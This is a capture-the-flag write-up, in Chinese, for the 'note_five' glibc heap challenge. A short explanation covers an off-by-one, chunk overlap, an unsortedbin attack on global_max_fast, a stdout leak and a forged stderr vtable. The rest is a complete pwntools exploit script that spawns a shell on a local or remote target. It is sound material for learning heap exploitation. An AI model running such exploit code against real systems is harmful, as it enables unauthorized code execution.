# note_five


环境是`Ubuntu18.04`，`2.27`的libc

程序的`edit`功能存在`off_by_one`,先`overlap`，然后`unsortedbin attack`攻击`global_maxfast`

然后一系列利用攻击到`stdout`泄露出libc，我选择的地方是`_IO_stdout_2_1-0x51`(1/16的概率)的位置，那里有个0xff

然后伪造`stderr`的`vtable`，最后触发`_IO_flush_all_lockp`
来getshell

```python

from pwn import *

def cmd(command):
	p.recvuntil("choice>> ")
	p.sendline(str(command))

def add(idx,sz):
	cmd(1)
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	p.recvuntil("size: ")
	p.sendline(str(sz))
	
	

def dele(idx):
	cmd(3)
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	
def edit(idx,content):
	cmd(2)
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	p.recvuntil("content: ")
	p.send(content)
	

def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./note_five")
		gdb.attach(p)
	add(0,0x98)
	add(1,0xa8)
	add(2,0x1e8)
	add(3,0xe8)
	
	dele(1)
	dele(0)
	dele(2)
	dele(3)
    
	#overlap
	add(0,0xe8)
	add(1,0xf8)
	add(2,0xf8)
	add(3,0x1f8)
	add(4,0xe8)
	dele(0)
	edit(1,"A"*0xf0+p64(0x1f0)+'\x00')
	dele(2)
	add(0,0xe8)
	
	# t = int(raw_input('guest: '))
	t = 8
	global_maxfast = (t << 12) | 0x7f8
	
	stdout = global_maxfast-0x11d8
	#unsortedbin attack
	edit(1,"\x00"*8+p16(global_maxfast-0x10)+'\n')
	add(2,0x1f8)
	edit(2,"A"*0x1f8+'\xf1')
	edit(0,"\x00"*0x98+p64(0xf1)+p16(stdout-0x51)+'\n')
	dele(0)
	dele(4)
	
	dele(3)
	add(3,0x2e8)
	edit(3,"A"*0x1f8+p64(0xf1)+'\xa0\n')
	dele(2)
	
	add(0,0xe8)
	add(2,0xe8)
	add(4,0xe8)
	#leak libc
	edit(4,'A'+"\x00"*0x40+p64(0xfbad1800)+p64(0)*3+'\x00\n')
	
	p.recv(0x40)
	
	libc.address = u64(p.recv(8))-0x3c5600
	info("libc : " + hex(libc.address))
	
	one_gadget = 0xf1147+libc.address
	
	payload = '\x00'+p64(libc.address+0x3c55e0)+p64(0)*3+p64(0x1)+p64(one_gadget)*2+p64(libc.address+0x3c5600-8)
	edit(4,payload+'\n')
	#trigger abort-->flush
	add(1,1000)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so",checksec=False)
	# elf = ELF("./mheap",checksec=False)
	main(args['REMOTE'])

```
